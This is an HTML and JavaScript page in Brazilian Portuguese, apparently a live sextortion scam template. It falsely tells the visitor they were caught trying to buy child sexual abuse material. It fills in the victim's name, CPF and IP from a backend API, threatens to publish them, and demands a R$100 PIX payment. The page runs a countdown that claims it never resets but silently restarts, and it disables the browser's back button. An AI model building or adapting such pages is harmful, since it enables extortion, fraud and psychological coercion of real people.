<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VOC√ä FOI PEGO NO FLAGRANTE</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    html, body {
      background: #F4F4F4;
      color: #111;
      font-family: Arial, Roboto, sans-serif;
      font-size: 18px;
      line-height: 1.6;
      height: 100vh;
      overflow-x: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 800px;
      background: #F4F4F4;
      padding: 30px;
      text-align: center;
    }
    
    .main-title {
      font-size: 32px;
      font-weight: bold;
      color: #D32F2F;
      margin-bottom: 30px;
      text-transform: uppercase;
    }
    
    .intro-text {
      font-size: 20px;
      font-weight: bold;
      color: #111;
      margin-bottom: 25px;
      text-align: left;
    }
    
    .accusation-text {
      font-size: 18px;
      color: #111;
      margin-bottom: 25px;
      text-align: left;
      line-height: 1.8;
    }
    
    .evidence-section {
      background: #EEEEEE;
      padding: 20px;
      border-left: 5px solid #D32F2F;
      margin: 25px 0;
      text-align: left;
    }
    
    .evidence-title {
      font-size: 20px;
      font-weight: bold;
      color: #D32F2F;
      margin-bottom: 15px;
    }
    
    .evidence-list {
      list-style: none;
      padding: 0;
    }
    
    .evidence-list li {
      font-size: 16px;
      color: #111;
      margin: 8px 0;
      padding-left: 20px;
      position: relative;
    }
    
    .evidence-list li::before {
      content: "‚Ä¢";
      color: #D32F2F;
      font-weight: bold;
      position: absolute;
      left: 0;
    }
    
    .crime-warning {
      font-size: 20px;
      font-weight: bold;
      color: #D32F2F;
      margin: 30px 0;
      text-align: center;
    }
    
    .exposure-warning {
      font-size: 18px;
      color: #111;
      margin: 25px 0;
      text-align: left;
    }
    
    .countdown-section {
      background: #FFEBEE;
      border: 2px solid #D32F2F;
      padding: 25px;
      margin: 30px 0;
      text-align: center;
    }
    
    .countdown-label {
      font-size: 18px;
      color: #111;
      margin-bottom: 15px;
    }
    
    .countdown {
      font-size: 48px;
      font-weight: bold;
      color: #D32F2F;
      font-family: 'Courier New', monospace;
      background: #000;
      color: #FF0000;
      padding: 15px 30px;
      border-radius: 5px;
      display: inline-block;
      letter-spacing: 2px;
      text-shadow: 0 0 10px #FF0000;
    }
    
    .countdown-warning {
      font-size: 16px;
      color: #111;
      margin-top: 15px;
      font-style: italic;
    }
    
    .solution-section {
      background: #FFF8E1;
      border: 3px solid #FFEB3B;
      padding: 25px;
      margin: 30px 0;
    }
    
    .solution-title {
      font-size: 24px;
      font-weight: bold;
      color: #111;
      margin-bottom: 20px;
    }
    
    .solution-text {
      font-size: 18px;
      color: #111;
      margin-bottom: 20px;
      text-align: left;
    }
    
    .pix-info {
      font-size: 22px;
      font-weight: bold;
      color: #D32F2F;
      margin: 20px 0;
    }
    
    .pix-details {
      background: #FFFDE7;
      border: 2px solid #FFC107;
      padding: 20px;
      margin: 20px 0;
      text-align: left;
    }
    
    .qr-section {
      margin: 25px 0;
      text-align: center;
    }
    
    .qr-code-container {
      display: inline-block;
      background: white;
      padding: 20px;
      border: 2px solid #111;
      margin: 15px 0;
    }
    
    .qr-code-image {
      max-width: 200px;
      max-height: 200px;
    }
    
    .pix-code-section {
      margin: 20px 0;
    }
    
    .pix-code-label {
      font-size: 16px;
      color: #111;
      margin-bottom: 10px;
      font-weight: bold;
    }
    
    .pix-code {
      font-family: 'Courier New', monospace;
      font-size: 12px;
      color: #111;
      background: #F5F5F5;
      padding: 15px;
      border: 1px solid #CCC;
      word-break: break-all;
      text-align: left;
    }
    
    .loading-qr {
      color: #111;
      font-size: 16px;
      margin: 20px 0;
    }
    
    .error-qr {
      color: #D32F2F;
      font-size: 14px;
      margin: 20px 0;
    }
    
    .final-warning {
      background: #FFCDD2;
      border: 2px solid #D32F2F;
      padding: 20px;
      margin: 30px 0;
      text-align: left;
    }
    
    .final-warning h3 {
      color: #D32F2F;
      font-size: 20px;
      margin-bottom: 15px;
    }
    
    .final-warning p {
      color: #111;
      font-size: 16px;
      margin: 10px 0;
    }
    
    .footer-threat {
      margin-top: 40px;
      padding-top: 20px;
      border-top: 1px solid #CCC;
      font-size: 14px;
      color: #666;
      text-align: center;
    }
    
    .footer-threat p {
      margin: 5px 0;
    }
    
    .stats {
      font-weight: bold;
      color: #D32F2F;
    }
    
    /* Mobile responsiveness */
    @media (max-width: 768px) {
      body {
        font-size: 16px;
        padding: 10px;
      }
      
      .container {
        padding: 20px;
      }
      
      .main-title {
        font-size: 24px;
      }
      
      .intro-text {
        font-size: 18px;
      }
      
      .countdown {
        font-size: 32px;
        padding: 10px 20px;
      }
      
      .pix-info {
        font-size: 18px;
      }
      
      .solution-title {
        font-size: 20px;
      }
      
      .qr-code-image {
        max-width: 150px;
        max-height: 150px;
      }
      
      .pix-code {
        font-size: 10px;
        padding: 10px;
      }
    }
    
    @media (max-width: 480px) {
      .main-title {
        font-size: 20px;
      }
      
      .countdown {
        font-size: 24px;
        padding: 8px 15px;
      }
      
      .container {
        padding: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="main-title">
      üö® VOC√ä FOI PEGO NO FLAGRANTE
    </div>
    
    <div class="intro-text">
      <span id="nome-cliente">[nome do cliente]</span>,<br>
      a gente rastreou sua tentativa de comprar conte√∫do proibido com menores de idade.
    </div>
    
    <div class="accusation-text">
      Voc√™ acessou isso √†s <span id="hora-tentativa">[hora da tentativa]</span>, usando o IP <span id="ip-cliente">[ip do cliente]</span>, e a porra do CPF <span id="cpf-cliente">[cpf do cliente]</span> t√° amarrado junto.
      <br><br>
      <strong>E a gente gravou tudo.</strong>
    </div>
    
    <div class="evidence-section">
      <div class="evidence-title">Temos:</div>
      <ul class="evidence-list">
        <li>Seu hist√≥rico</li>
        <li>Registro de acesso completo</li>
        <li>Print do que voc√™ tentou comprar</li>
        <li>Seu aparelho, localiza√ß√£o e dados do sistema</li>
      </ul>
    </div>
    
    <div class="crime-warning">
      Voc√™ cometeu crime. E a gente tem prova.
    </div>
    
    <div class="exposure-warning">
      Esse caso vai ser publicado em sites abertos, grupos de den√∫ncia e f√≥runs com seu nome, CPF e IP, daqui a:
    </div>
    
    <div class="countdown-section">
      <div class="countdown-label">üïí</div>
      <div class="countdown" id="contador">10:00</div>
      <div class="countdown-warning">
        (esse tempo N√ÉO reinicia, nem se voc√™ sair. Zerou, j√° era.)
      </div>
    </div>
    
    <div class="solution-section">
      <div class="solution-title">‚úÖ COMO EVITAR O VAZAMENTO</div>
      <div class="solution-text">
        Se tu pagou sem saber, foi enganado, ou quer impedir que isso exploda geral, tem uma chance de apagar isso da nossa base:
      </div>
      <div class="pix-info">PIX DE APAGAMENTO: R$ 100,00</div>
      
      <div class="pix-details">
        <div id="qr-loading" class="loading-qr">
          Gerando QR code PIX...
        </div>
        
        <div id="qr-container" class="qr-section" style="display: none;">
          <div class="qr-code-container">
            <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
          </div>
        </div>
        
        <div id="pix-code-container" class="pix-code-section" style="display: none;">
          <div class="pix-code-label">Chave PIX (Copia e Cola):</div>
          <div id="pix-code" class="pix-code"></div>
          <div style="font-size: 14px; color: #666; margin-top: 10px;">
            <strong>Nome do grupo:</strong> Rede Digital An√¥nima
          </div>
        </div>
        
        <div id="qr-error" class="error-qr" style="display: none;">
          Erro ao gerar QR code. Tente recarregar a p√°gina.
        </div>
      </div>
      
      <div class="solution-text">
        Depois disso, o hist√≥rico √© deletado.<br>
        Se o tempo acabar, j√° era. Vai tudo pro ar.
      </div>
    </div>
    
    <div class="final-warning">
      <h3>üõë ATEN√á√ÉO</h3>
      <p>Isso aqui √© s√©rio.</p>
      <p>N√£o tem volta.</p>
      <p>N√£o tem e-mail.</p>
      <p>N√£o tem suporte.</p>
      <p><br>A gente n√£o √© empresa. A gente √© rede.</p>
      <p><br><strong>Voc√™ foi pego fazendo merda.</strong></p>
      <p><br>Se pagar, apaga. Se n√£o pagar, vaza.</p>
    </div>
    
    <div class="footer-threat">
      <p>Essa mensagem foi gerada automaticamente por um dos nossos servidores.</p>
      <p><strong>Voc√™ est√° sendo monitorado.</strong></p>
      <p class="stats">Mais de 19 pessoas j√° foram expostas.</p>
    </div>
  </div>

  <script>
    // Capturar dados da URL
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    
    // Vari√°veis para controle da sess√£o
    let sessionId = null;
    let timerInterval = null;
    
    // Dados padr√£o
    let dadosCliente = {
      nome: '[nome do cliente]',
      cpf: '[cpf do cliente]',
      ip: '[ip do cliente]',
      hora: '[hora da tentativa]'
    };
    
    // Fun√ß√£o para obter hora atual formatada
    function obterHoraAtual() {
      const agora = new Date();
      const horas = agora.getHours().toString().padStart(2, '0');
      const minutos = agora.getMinutes().toString().padStart(2, '0');
      return `${horas}:${minutos}`;
    }
    
    // Fun√ß√£o para criar nova sess√£o de timer
    async function criarSessaoTimer() {
      if (!token) {
        console.log('Token n√£o encontrado, usando timer padr√£o');
        iniciarTimerPadrao();
        return;
      }
      
      try {
        const response = await fetch('/api/criar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ token: token })
        });
        
        const data = await response.json();
        
        if (data.success) {
          sessionId = data.sessionId;
          console.log('Sess√£o de timer criada:', sessionId);
          iniciarTimerSessao();
        } else {
          console.log('Erro ao criar sess√£o:', data.error);
          iniciarTimerPadrao();
        }
      } catch (error) {
        console.log('Erro na requisi√ß√£o:', error);
        iniciarTimerPadrao();
      }
    }
    
    // Fun√ß√£o para iniciar timer baseado na sess√£o
    function iniciarTimerSessao() {
      if (!sessionId) {
        iniciarTimerPadrao();
        return;
      }
      
      // Atualizar contador baseado na sess√£o
      timerInterval = setInterval(async () => {
        try {
          const response = await fetch(`/api/status-sessao-timer/${sessionId}`);
          const data = await response.json();
          
          if (data.success && data.active) {
            const minutos = Math.floor(data.timeRemaining / 60);
            const segundos = data.timeRemaining % 60;
            const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
            document.getElementById('contador').textContent = display;
            
            if (data.timeRemaining <= 0) {
              // Timer expirou, finalizar sess√£o
              await finalizarSessao();
              iniciarNovaContagem();
            }
          } else {
            // Sess√£o n√£o encontrada ou inativa, usar timer padr√£o
            clearInterval(timerInterval);
            iniciarTimerPadrao();
          }
        } catch (error) {
          console.log('Erro ao verificar status da sess√£o:', error);
          // Em caso de erro, continuar com timer padr√£o
          clearInterval(timerInterval);
          iniciarTimerPadrao();
        }
      }, 1000);
    }
    
    // Fun√ß√£o para finalizar sess√£o atual
    async function finalizarSessao() {
      if (!sessionId) return;
      
      try {
        await fetch('/api/finalizar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ sessionId: sessionId })
        });
      } catch (error) {
        console.log('Erro ao finalizar sess√£o:', error);
      }
      
      sessionId = null;
    }
    
    // Fun√ß√£o para iniciar nova contagem (criar nova sess√£o)
    function iniciarNovaContagem() {
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      // Aguardar um momento e criar nova sess√£o
      setTimeout(() => {
        criarSessaoTimer();
      }, 1000);
    }
    
    // Fun√ß√£o de fallback para timer padr√£o (comportamento original)
    function iniciarTimerPadrao() {
      let tempoRestante = 10 * 60; // 10 minutos em segundos
      
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      
      timerInterval = setInterval(() => {
        const minutos = Math.floor(tempoRestante / 60);
        const segundos = tempoRestante % 60;
        const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
        document.getElementById('contador').textContent = display;
        
        if (tempoRestante > 0) {
          tempoRestante--;
        } else {
          // Quando chegar a zero, reiniciar
          tempoRestante = 10 * 60;
        }
      }, 1000);
    }
    
    // Definir hora atual como padr√£o
    dadosCliente.hora = obterHoraAtual();
    document.getElementById('hora-tentativa').textContent = dadosCliente.hora;
    
    // Tentar buscar dados reais se token existir
    if (token) {
      fetch(`/api/dados-comprador?token=${token}`)
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            if (data.nome && data.nome !== 'N/A') {
              dadosCliente.nome = data.nome;
              document.getElementById('nome-cliente').textContent = dadosCliente.nome;
            }
            if (data.cpf && data.cpf !== 'N/A') {
              dadosCliente.cpf = data.cpf;
              document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
            }
            if (data.ip && data.ip !== 'N/A') {
              dadosCliente.ip = data.ip;
              document.getElementById('ip-cliente').textContent = dadosCliente.ip;
            }
          }
        })
        .catch(error => {
          console.log('Usando dados padr√£o');
        });
    }
    
    // Fun√ß√£o para gerar QR code PIX
    async function gerarQRCodePIX() {
      const loadingElement = document.getElementById('qr-loading');
      const qrContainer = document.getElementById('qr-container');
      const pixCodeContainer = document.getElementById('pix-code-container');
      const errorElement = document.getElementById('qr-error');
      const qrImage = document.getElementById('qr-image');
      const pixCode = document.getElementById('pix-code');
      
      try {
        console.log('Gerando QR code PIX...');
        
        const response = await fetch('/api/gerar-qr-pix', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({})
        });
        
        const data = await response.json();
        
        if (data.success && data.qr_code_base64 && data.pix_copia_cola) {
          // Esconder loading
          loadingElement.style.display = 'none';
          
          // Mostrar QR code
          qrImage.src = data.qr_code_base64;
          qrContainer.style.display = 'block';
          
          // Mostrar c√≥digo PIX
          pixCode.textContent = data.pix_copia_cola;
          pixCodeContainer.style.display = 'block';
          
          console.log('QR code PIX gerado com sucesso:', data.transacao_id);
        } else {
          throw new Error(data.error || 'Erro desconhecido');
        }
        
      } catch (error) {
        console.error('Erro ao gerar QR code PIX:', error);
        
        // Esconder loading
        loadingElement.style.display = 'none';
        
        // Mostrar erro
        errorElement.style.display = 'block';
        errorElement.textContent = 'Erro ao gerar QR code PIX. Tente recarregar a p√°gina.';
      }
    }
    
    // Inicializar sistema de timer
    criarSessaoTimer();
    
    // Gerar QR code PIX quando a p√°gina carregar
    gerarQRCodePIX();
    
    // Limpar sess√£o quando a p√°gina for fechada
    window.addEventListener('beforeunload', () => {
      if (sessionId) {
        // Usar sendBeacon para enviar requisi√ß√£o mesmo quando a p√°gina est√° sendo fechada
        const formData = new FormData();
        formData.append('sessionId', sessionId);
        navigator.sendBeacon('/api/finalizar-sessao-timer', formData);
      }
    });
    
    // Impedir back/forward
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
  </script>
</body>
</html>